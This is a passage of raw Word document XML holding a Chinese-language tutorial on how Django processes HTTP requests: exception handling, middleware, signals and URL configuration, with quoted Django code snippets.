          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置中给</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> handler500 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>变量赋值来更改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25482242"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此外，对于除了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.Http404 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>内置的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> SystemExit </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>之外的任</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何异常，处理器会给调度者发送信号</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> got_request_exception</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，在返回之前，构</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建一个关于异常的描述，把它发送给列在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置文件的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> ADMINS </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置中的</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每一个人。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B571557"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73" w:name="sec18"/>
      <w:bookmarkEnd w:id="73"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，最后回合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DAA2DE"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现在，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>无论 get_response 在哪一个层次上发生错误，它都会返回一个 HttpResponse 实例，因此我们回到处理器的主要部分。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>一旦它获得一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>它做的第一件事就是遍历它的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> _response_middleware </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实例变量并</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应用那里的方法，传入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest </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 xml:space="preserve"> HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>作为参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA6E694"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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E8A3FE"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Reset URLconf for this thread on the way out for complete</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE81439"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isolation of request.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>urlconf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5CBD7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urlresolvers.set_urlconf(None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DCD07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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7035A64A"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Apply response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, regardless of the response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55394EE8"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for middleware_method in </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>._response_middleware:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1294F50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response = middleware_method(request, response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77889961"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lastRenderedPageBreak/>
        <w:t>response = </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>.apply_response_fixes(request, response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7112E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注意对于任何想改变点什么的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来说，这是它们的最后机会。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EEFAB6" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E50F7D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="74" w:name="sec19"/>
      <w:bookmarkEnd w:id="74"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>The check is in the mail</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05150D4F"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是该结束的时候了。一旦</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完成了最后环节，处理器将给调度者发送</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信号</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> request_finished</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，对与想在当前的</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中执行的任何东西来说，这</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绝对是最后的调用。监听这个信号的处理者会清空并释放任何使用中的资源。比</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如，</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request_finished </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>监听者会关闭所有数据库连接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13AC467A"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这件事发生以后，处理器会构建一个合适的返回值送返给实例化它的任何东西</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（现在，是一个恰当的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> mod_python response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>或者一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> WSGI </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>兼容的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，这取决于处理器）并返回。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53186154" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00E50F7D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="75" w:name="sec20"/>
      <w:bookmarkEnd w:id="75"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>呼呼</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695AB765"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结束了，从开始到结束，这就是</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如何处理一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> request</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583A7C66" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00BC6A81" w:rsidRDefault="00870C85" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="6754CA"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>一、</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>工作流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C345AC" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在开始具体的代码之旅前，先来宏观地看下</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是如何处理</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http Resquest</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的，如下图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C54B18D" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50B9171A" wp14:editId="67B81184">
            <wp:extent cx="5082673" cy="2208930"/>
            <wp:effectExtent l="0" t="0" r="3810" b="127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1361" cy="2217052"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="782C2E6F" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing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假设你已经在浏览器输入了</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId128" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00DC672E">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="6466B3"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://127.0.0.1:8000/polls/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，接下来浏览器会把请求交给</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处理。根据上图，我们知道</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需要根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来决定交给谁来处理请求，那么</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是如何完成这项工作呢？很简单，</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要求程序员提供</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件，并且在该类文件中指定请求链接与处理函数之间的一一对应关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FE4BB7"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中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>添加以下语句，即可指定请求链接与处理函数之间的一一对应关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23AB7AD5"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urlpatterns = patterns(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0493FE92"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>''</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
